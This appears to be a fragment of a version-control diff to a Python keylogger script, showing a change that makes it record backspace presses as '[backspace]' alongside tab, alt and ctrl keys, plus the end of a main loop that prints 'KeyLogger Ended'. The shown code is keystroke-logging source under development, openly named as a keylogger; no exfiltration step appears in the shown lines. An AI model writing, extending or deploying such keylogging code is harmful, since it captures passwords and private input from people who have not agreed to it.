@@ -22,7 +22,7 @@ def on_press(key):
     elif key == keyboard.Key.tab:
         writeToFile("    ")
     elif key == keyboard.Key.backspace:
-        pass
+        writeToFile("[backspace]")
     elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
         writeToFile("[alt]")
     elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
@@ -44,8 +44,6 @@ def main():
             while kb.kbhit(): kb.getch()    
             print("KeyLogger Ended")
     
-    
-
 
 if __name__ == "__main__":
     main()
